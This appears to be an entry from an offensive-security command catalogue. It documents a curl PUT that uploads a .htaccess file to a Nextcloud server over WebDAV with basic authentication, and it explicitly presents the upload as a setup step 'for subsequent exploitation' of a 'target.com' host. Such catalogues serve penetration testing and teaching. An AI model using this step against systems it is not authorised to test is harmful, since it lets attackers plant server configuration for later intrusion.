---
id: cmd-curl-upload
data: >-
  curl -X PUT -u username:password
  'https://nextcloud.example.com/remote.php/dav/files/username/test.htaccess'
  --data-binary '@.htaccess' -H 'Content-Type: text/plain'
tags:
  - webdav
  - upload
type: command
output: |-
  HTTP/1.1 201 Created
  <dav:propstat><dav:status>HTTP/1.1 201 Created</dav:status></dav:propstat>
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:06.556Z'
verified: false
validated: true
submitted: true
---
# curl-upload-file

## Command

```bash
curl -X PUT -u username:password 'https://nextcloud.example.com/remote.php/dav/files/username/test.htaccess' --data-binary '@.htaccess' -H 'Content-Type: text/plain'
```

## Description

This command uploads a local .htaccess file to Nextcloud via its WebDAV API, using basic authentication to place the file in the user's directory for subsequent exploitation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X PUT` | Specifies the HTTP PUT method for upload | Yes |
| `-u username:password` | Provides basic auth credentials | Yes |
| URL | Target WebDAV endpoint | Yes |
| `--data-binary '@.htaccess'` | Reads file content for upload | Yes |
| `-H 'Content-Type: text/plain'` | Sets MIME type | No |

## Examples

### Basic Usage

```bash
curl -X PUT -u user:pass 'https://target.com/remote.php/dav/files/user/file.htaccess' --data-binary '@file.htaccess'
```

### Advanced Usage

```bash
curl -X PUT -u user:pass 'https://target.com/remote.php/dav/files/user/file.htaccess' --data-binary '@file.htaccess' -H 'OCS-APIRequest: true' --fail
```

## Expected Output

Successful upload returns HTTP 201 Created with XML response confirming the propstat status.

## Related

- [[Related Procedure|procedures/Upload-htaccess-File-to-Nextcloud]]
